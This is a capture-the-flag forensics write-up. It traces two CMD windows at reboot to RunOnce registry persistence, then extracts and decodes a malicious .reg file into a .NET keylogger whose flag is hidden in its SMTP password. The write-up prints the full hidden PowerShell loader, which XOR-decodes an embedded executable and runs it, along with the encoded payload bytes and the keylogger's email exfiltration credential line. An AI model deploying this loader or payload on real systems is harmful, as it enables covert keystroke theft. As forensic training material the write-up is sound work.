# Description
Mikey noticed out of the sudden that, whenever he reboots his PC, two CMD windows popup and close instantly. He informed me that this issue seems kind of persistent. I got an image from his machine to try and solve the mistery behind the CMD windows. Wanna help?

# Solution
We are provided with an archive file. Extracting the files inside it, we get a file named `autopsy.db` and another file named `InfectedMachine.aut`. If we search a bit online of what these files are, we will discover they are files used in the Autopsy tool, a forensic tool to investigate Images taken from other machines.  

Downloading the tool and opening it, we choose `Open Case` and load the `.aut` file provided. Make sure both the `.db` and `.aut` files provided to you are in the same folder.  
An error will appear in Autopsy trying to locate the `.E01` file, where we can manually specify its location to resolve this issue.  
After loading the files, Autopsy shows everything you might need from Mikey's machine. Now what?   

Well, the description made a reference to a `persistent` issue on Mikey's machine and CMD windows poping up every time he reboots his machine. If you are not familiar with persistence on Windows machines, a very basic way of achieving persistence is using the `Run` and `RunOnce` registry keys. There, malware authors create registry keys and as values they provide commands. Every time the system reboots, these registry keys will run, allowing persistence.  

Now, where do we find these keys?  
These keys are - at least for the current user - in the location `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`. The specific tree can be found on the current user inside a file called `NTUSER.dat`:  

![](Images/image1.png)  

The reason we used this file to be able to read the registry keys of the current user (Mikey) is because the file `NTUSER.dat` is responsible for storing information of a specific user account such as desktop settings, start menu configs, application preferences and registry settings.  

Navigating to the specific path of the registry, we locate two very interesting registry keys:  

![](Images/image2.png)  

The first command is: `cmd.exe /c "powershell -windowstyle hidden $reg = gci -Path C:\ -Recurse *.reg ^| where-object {$_.length -eq 0x00002AE3} ^| select -ExpandProperty FullName -First 1; $bat = "%temp%\tmpreg.bat'; Copy-Item $reg -Destination $bat; ^& $bat;"`  
The second command is: `cmd /c more +7 %temp%\tmpreg2.bat & %emp%\tmpreg2.bat`  

This explains the two popup CMD windows (since we have two startup cmd execution commands). What do these commands do though? 

Basically, they try to locate a file that has a `.reg` extention and copies some of its data into a `.bat` file. Then, they skip the firsr 7 lines of the `.bat` file and execute a new `.bat` file contaning the rest of the code. It might not make a lot of sense, but all operations are oriented around the mysterious `.reg` file. Let's locate that!  

To do so, we have to navigate to `Tools->File Search by Attributes` and search for `.reg`:  

![](Images/image3.png)  

Running the following command, we get back only 1 file with a `.reg` extention that also contains very suspicious data:  

![](Images/image4.png)  

We can right click on the file and extract it for further analysis.
The data inside the registry file are:  
```
REGEDIT4

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce]
"startup_entry"="cmd.exe /c \"powershell -windowstyle hidden $reg = gci -Path C:\\ -Recurse *.reg ^| where-object {$_.length -eq 0x00002AE3} ^| select -ExpandProperty FullName -First 1; $bat = '%temp%\\tmpreg.bat'; Copy-Item $reg -Destination $bat; ^& $bat;\""
"startup_entry2"="cmd /c more +7 %temp%\\tmpreg.bat > %temp%\\tmpreg2.bat & %emp%\\tmpreg2.bat"



cmd /c "powershell -windowstyle hidden $file = gc '%temp%\\tmpreg.bat' -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x77 }; $path = '%temp%\tmp' + (Get-Random) + '.exe'; sc $path ([byte[]]($file^| select -Skip 000739)) -Encoding Byte; ^& $path;"
exit
:-ηwtwwwswwwwwΟwwwwwww7wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwχwwwyhΝywΓ~ΊVΟv;ΊV#WWWWWW38$WYzz}Swwwwwww'2ww;vtwςΎwwwwwwww—wUw|vGwwiwwwwwwwww=KwwwWwww7wwww7wwWwwwuwwswwwwwwwqwwwwwwwwχwwwuwwwwwwuwςwwgwwgwwwwgwwgwwwwwwgwwwwwwwwwwwLww8wwww7wwΫrwwwwwwwwwwwwwwwwwwwww{www·MwwkwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwWwwwwwwwwwwwwwWww?wwwwwwwwwwwYwww'kwwwWwwwiwwwuwwwwwwwwwwwwwwWwwYwwwΫrwww7wwwqwwwWwwwwwwwwwwwwww7ww7Yww{wwwwwwwuwwwQwwwwwwwwwwwwww7ww5wwwwwwwwwwwwwwww[Kwwwwww?wwwuwrwΛ\wwsxwwtwuwuwwqwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwAwqwwq_twwqw]wwdGtwΏwwwvwwfwuvwws_xww}|p[zuvwwso_gww}wfww}}qTwwwwχ8E6eww}wqu‰qrwwqdww}cww}wq`bww}wq`aww}w\wa{\ w_vwwqz~`Y}~Wvχ‰v\v`dsfs[Bwuvwws``ww}druvwwso_gww}wfru_swwqoww}wfrnww}w\dw`/{Wwww‰sdqfqZμw`dp\ηdGtw~wwuwwfwvww}ti‰v|p[|tww}O;~wwth~‰v{[|fww}OO~wwthz‰vz~[|jww}OS~wwthd‰vdsfs[|Zww}Oy~wwthc‰vdrfr[|Jww}Owwthl‰vdqfq[|"ww}O•wwthW‰vdpfp[|ww}O»wwthV‰vdf[|ww}OΑwwthU‰vd~f~[|ςww}OΧwwthT‰vd}f}[|κww}OύwwthS‰vd|f|[|ήww}OwwthR‰vd{f{[|ΐww}O)wwthQ‰vdzfz[|΄ww}O?wwthP‰vdyfy[|Ίww}OEwwth_‰vdxfx[|ww}Okwwth[‰vdgfg[|ww}OqwwthZ‰vdfff[|~vw}O‡pwwthY‰vdefe[|lvw}O­pwwthG‰vddfd[|Zvw}O³pwwthF‰vdcfc[|Fvw}OΩpwwthE‰vdbfb[|Bvw}OοpwwthD‰vdafa[|Nvw}OυpwwthC‰vd`f`[|Jvw}OpwwthB‰vdofo[|6vw}O!pwwthA‰vdnfn[|2vw}O7pwwth@‰vdmfm[|>vw}O]pwwthO‰vdlfl[|:vw}OcpwwthN‰vdkfk[|&vw}O‰qwwth6‰vdjfj[|"vw}Oqwwth5‰vdifi[|.vw}O¥qwwth4‰vdhfh[|*vw}OΛqwwth3‰vdWfW[|vw}OΡqwwth2‰vdVfV[|vw}Oηqwwth1‰vdUfU[|vw}O
qwwth0‰vdTfT[|vw}Oqwwth?‰vdSfS[|vw}O9qwwth>‰vdRfR[|vw}OOqwwth=‰vdQfQ[|vw}OUqwwth<‰vdPfP[|
vw}O{qwwth;‰vd_f_[|φvw}Orwwth:‰vd^f^[|ςvw}O—rwwth9‰vd]f][|ώvw}O½rwwth8‰vd\f\[|ϊvw}OΓrwwth'‰vd[f[[|ζvw}Oιrwwth&‰vdZfZ[|βvw}Orwwth%‰vdYfY[|ξvw}Orwwth$‰vdXfX[|κvw}O+rwwth#‰vdGfG[|Φvw}O1rwwth"‰vdFfF[|vw}OGrwwth!‰vdEfE[|ήvw}Omrwwth ‰vdDfD[|Ϊvw}Osrwwth/‰vdCfC[|Ζvw}O™swwth.‰vdBfB[|Βvw}O―swwth-‰vdAfA[|Ξvw}Oµswwth,‰vd@f@[|Κvw}OΫswwth+‰vdOfO[|Κvw}Oαswwth*‰vdNfN[|¦vw}Oχswwth‰vdMfM[|Zvw}Oswwth‰vdLfL[|Fvw}O#swwth‰vdKfK[|Bvw}OIswwth‰vdJfJ[|Nvw}O_swwth‰vdIfI[|Jvw}Oeswwth‰vdHfH[|6vw}O‹twwth‰vd7f7[|2vw}O‘twwth‰vd6f6[|>vw}O§twwth‰vd5f5[|:vw}OΝtwwth‰vd4f4[|&vw}OΣtwwth‰vd3f3[|¨vw}Oωtwwth‰vd2f2[|”vw}Otwwth‰vd1f1[|vw}Otwwth‰vd0f0[|vw}O;twwth‰vd?f?[|vw}OAtwwth‰vd>f>[|„vw}OWtwwth‰vd=f=[|vw}O}twwth‰vd<f<[|puw}Oƒuwwth‰vd;f;[|fuw}O©uwwth‰vd:f:[|luw}OΏuwwth‰vd9f9[|Ruw}OΕuwwth‰vd8f8[|Xuw}Oλuwwth ‰vd'f'[|Nuw}Oρuwwth‰vd&f&[|4uw}Ouwwth‰vd%f%[|:uw}O-uwwth
‰vd$f$[|.uw}O3uwwth‰vd#f#[|uw}OYuwwtWηwww‰vd"f"[|uw}ObuwwtWζwww‰vd!f![|πuw}O‹vwwtWΧwww‰vd f [|Τuw}O”vwwtWΦwww‰vd/f/[|Τuw}O½vwwtWΥwww‰vd.f.[|Δuw}OΖvwwtWΤwww‰vd-f-[|Δuw}OοvwwtWΣwww‰vd,f,[|¶uw}OvwwtWwww‰vd+f+[|¶uw}OvwwtWΜwww‰vd*f*[|Ίuw}O:vwwtWΝwww‰vd)f)[|¦uw}OCvwwtWΛwww‰vd(f([|vw}OlvwwtWΚwww‰vdf[|vw}OuvwwtWΙwww‰vdf[|Άuw}OwwwtW·www‰vdf[|®uw}O§wwwtWΘwww‰vdf[|uw}OΐwwwtW¶www‰vdf[|vw}OιwwwtWµwww‰vdf[|Άuw}OςwwwtW¬www‰vdf[–uw}\tW«www‰vdf[’uw}\.tWwww‰vdf[uw}\4tW©www‰vdf[uw}\ZtW•www‰vdf[†uw}\`uwxv_mww}’uw_lww}}qd\wf]wwlGtw§wwwtwwfwwkww}}‚uwjww}|qdtwiww}hww}wqWww}htwVww}wq^tw_Uww}Tww}_Sww}Rww}wuvwws_xww}a‰vdsfs[u©uvwwsQww}{Pww}z_ww}wuvwws_^ww}wq~]ww}wpW<uww\ww}wpBtwtw[ww}Zww}wp`Yww}wpqXww}ww©qdrww©w]vgwwwwvwΏΎwq`wwv	uh__Gww}¬tw_Sww}
vwwsu_Fww}w]5$=5vwvwwwww{wwwCYGYDGDFNwwwwrwwwwοtwwT	wwsswwƒswwT$wwwwww‡twwT"$w{wwgwwwT0">3www{ww{uwwT5wwwwwwwuwwv buc~wwwwvDwawwvwwwQwwwuwwwvwwwqwwwrwwwFwwwywwwtwwwvwwwvwwwvwwwuwwwww‹vvwwwwwqwvιtqw©vιtqwwtxwΙtwwqwΊwΌuqw#vΌuqwBvΌuqw²vΌuqwζvΌuqwέvΌuqw“wΌuqwΞwtqwΰwtqwovΌuqww}uqw8sΑu}w?tPsqw9tgw}wtPs}w'wu}wsuqwstgwqw„uΑuqw+wgwqwΊtgw}wCtPsqw,tgwqwvwΑuqwQuΑu}wBsu}wuuqw–s#uqw¥sgsqwftgw}w5us}wΫssqwρsΑuΰwktwwwwwwpwwwwwvwvwwwgwΩu]t6wvwvwvwLugvwwwwχwαWwdvvw'Wwwwwζw±uovuwWwwwwφwκsqwtwCVwwwwφwΏsivtwΗ]wwwwφwόuTvswλ\wwwwρotqwqwwwvw7uwwvwtwwvw<wwwvw3wwwuwu~wtvwfwtqwnwt}w^wtgwFwtgwNwtgw6wtgw>wtgw&wtgw.wtgwwtbwwtgwwtgwwtgw¶w6sPw¶w«t[wώwtqwώwuDw¦wtOwώwDwIwώwsbwώwPwbwζwt3w®wζwgw®wwqw–wSuΞww?sΚwΦwtqwήwtgw†wtgwΦwΚu¦wΦwu wwTwgwvvεs«w~vwΞww?s•wΦw!sgwΖwtgwfvwΞwfvwqw¶wύwwΦwΘsgwήwΤsvwnvtwήwws„wήwΧubwήwHww^vZuwvφwtqwYw|w]vYwdwDvYwlw%vYwTw,vYw\wvYwDwvYwLwvYw4w,vYw<wvYw$wvYw,wvYwwvYwwΕvYwwΘvmw=w³wβuwvtwwvwsχwwvwwwwwwwwwwwww]twwswwwwwwwwwwwpvmwwwwwswwwwwwwwwwwpvΑuwwwwwww>DEwK:Iw$Y>8ww6w(2w(2w$www::w1w(9w%;w4w06<$w3w w06w36w4!6w6#6w6#6w#1 6w61!6w646w636w4%6w6'6w646w646w%46w<;Yw$Y%Y!w#$w01'www9 4w$Y$Y'w(>w$Y9Y:w2wDEYw(2$w'w$w(1w:w$Y%w:64w2w(#w$%w#%w$1w<;w22?w#w$ w# wYw$Y3w$Y%Y>$w$Y%Y4$w3:w16w$6w226ww(4w$Y$Y4w$Y#w:6w2w4w8w($w$Y9w(6%w$4w2w04ww('w>45?w(5w<w4>w  >wwwwwvwz,w5wwww*ww|,w#w6w5w*wwx,w2wwwww*wwx,w'wwwww*ww`,w4wwwwWw;wwww*ww|,w2www*wwx,w$wwwww*wwd,w'wwwwWw"ww*ww`,w'wwwwWw3ww ww*ww|,w2www*wwz,w?wwww*ww|;wwww*ww~,w"ww*wwx,w%wwwww*wwz,w3ww ww*wwj,w'wwwwwWw$wwwwww*wwf,w>wwwwww*wwf,w3wwwwww*wwtGwwtFwwtEwwtDwwtCwwtBwwtAwwt@wwtOwwtNwwtwwtwwtwwtwwtwwtwwtwwtwwtwwtwwtwwtwwtwwtwwtwwtwwtwwtwwtwwtwwtwwtwwt wwtwwtwwt
wwd,w wwwww ww*wwz,w;wwww*wwt]wwt\wwtZwvt[wwtXww~,w1wFw*ww~,w1wEw*ww~,w1wDw*ww~,w1wCw*ww~,w1wBw*ww~,w1wAw*ww~,w1w@w*ww~,w1wOw*ww~,w1wNw*ww|,w1wFwGw*ww|,w1wFwFw*ww|,w1wFwEw*wwb,w9wwwWw;wwww*wwl,w$wwwwwwWw;wwww*wwx,w$wwwww*wwz,w4wwww*ww|,w6www*wwtJwwtwvtYwwtPwvtLwwtΓwvt*wwt,wwt	wwt+wwjwwwwYwwwwwwYwwwww|wwwwww~wwwww|;wwwMwWwwDwwwwwDwGwCwCwDwEwDwCw7wwwwwwwwYwwwww!w?w=wwww1www
w9ww.ww9ww-w3w1ww-wFwNww:wDwww:w0www:w
w>wFw/wDw&w w/wDw>w
w-wEw.www3w:wFww&wJwJwwf+w;wwwYwwwwwwww½iY8<Θ|‹ΌwsWvvtWwvrWvvffsWvvysWvvu{pe2uue>uuswvuyqwuvyfsWvvzrWuvkorWvverWuvyupyuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuytWwyqwtyyyy{pqe&e"e.yue*rWvvesWwe
rwweχφrwuyyyswvvyrWuvyyqWvveχζrWvve&qwvyfχξΐ
+!nC—ώuqyswvrwvvjysWvyqWuvke:vwwwwwwivwvw#ua 92# vvwpvwwwwyvw~<;wwrvwwww`vwe4WµήWWEGF@ww^vwSB@NNNFEZNGCZCDNZONEBZOGCNOFOCGww{vwpFYGYGYGww>vwmY92#1 [!JCYOvw#yc1 39eY92#W1 WCYOwwwwwwwςΎwwwwuwwwkvww«Mww«kww%$3$~ΠZΦ7Πω^…ΤG„vwww4M+"+(CB+3 +ZZ+<;+<;++3+<;YwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwWKwwwwwwwwwwMKwwwWwwwwwwwwwwwwwwwwwwwwww[Kwwwwwwwwwwww(42:wYwwwwwRwW7wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwuwgwwwWwwχowww'wwχwwwwwwwwwwwwwwvwvwwwOwwχwwwwwwwwwwwwwwvwwwwwχwwwwwwwwwwwwwwwwwvwvwwwwwχwwwwwwwwwwwwwwvwwwwwΫtwwη7wwktwwwwwwwwwwktCwww!w$w(w!w2w%w$w>w8w9w(w>w9w1w8wwwwwΚs‰wwvwwwvwwwwwwwvwwwwwHwwwwwwwswwwvwwwwwwwwwwwwwww3wwwvw!www1wwww>wwwwwwwwSwswww#wwwwwwwwwwwwwwwwwΗsuwwvw$wwwwww1wwww>wwwwww/uwwvwGwGwGwGwGwCwwGwwwmwvwvw4wwwwwwwwwwwwwwUwvwvw4wwwwwww9wwwwwwwwwwwwKw}wvw1wwww3wwwwwwwwwwwwwww<www;wwwwwwwwGwwvw1wwww!wwwwwwwwwwwFwYwGwYwGwYwGwwwKwywvw>wwwwwwww9wwwwww<www;wwwwwwYwwwwww?wewvw;wwwww4wwwwwwwwwww4wwwwwwwwwWwήwWwWwEwGwFw@www]wvwvw;wwwww#wwwwwwwwwwwwwwwwww3wywvw8wwwwwwww1wwwwwwwwww<www;wwwwwwYwwwwwwCw}wvw'wwwwwww9wwwwwwww<www;wwwwwwwwCwwvw'wwwwwww!wwwwwwwwwFwYwGwYwGwYwGwwwOwwvw6wwwwwwwwWw!wwwwwwwwwFwYwGwYwGwYwGwwwΛ4wwvwwwwwwwwwwΜΘKHWJUFYGUWJU"#1ZOUWJUUHIz}z}KWJUMZZMYFUW!JUFYGUIz}WWK>WJUFYGYGYGUWJU:6YUXIz}WWK>WJUMZZMYEUIz}WWWWKIz}WWWWWWK'WJUMZZMYDUIz}WWWWWWWWK2;WJU>UW6JUUXIz}WWWWWWKX'Iz}WWWWKXIz}WWKX>Iz}KXIwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwGww{www;Kwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww
```

We notice that the command tries to read the file from a specific offset, then xor with the key `0x77` and then run the result that is stored as an executable.  
By loading the `.reg` file onto Cyberchef and keeping only the bytes after the `exit`, if we xor with the byte `0x77` we will get the following executable:  

![](Images/image5.png)  

> Note: Copy and pasting bytes by hand might lead to invalid executable, so make sure to load the `.reg` file itself and then keep only the bytes you want to decrypt.

If we save this file and run the `file` command on it, we will see it is a Mono/.Net assembly:  
```sh
└─$ file extracted.exe  
extracted.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```
These files can be viewed with tools like DNSpy or ILSpy. I prefer ILSpy for static analysis, so I'll go with that one.

Opening the file in ILSpy, we get that our program is a Keylogger! What it does in more details is it stores the users keystrokes, and sends them over as logs via email, with credentials being:  

`smtpClient.Credentials = new NetworkCredential("cafim30443234@arinuse.com", "VHJvamFuezNtYjNkZDFuZ19rM3lsMGdnMzI1X3QwX3IzZ2YxbDM1fQ==");`

![](Images/image6.png)  

The password part seems kinda sus, so by decoding from base64, we finally get our flag!  
```python
>>> from base64 import b64decode
>>> b64decode(b"VHJvamFuezNtYjNkZDFuZ19rM3lsMGdnMzI1X3QwX3IzZ2YxbDM1fQ==")
b'Trojan{3mb3dd1ng_k3yl0gg325_t0_r3gf1l35}'
```
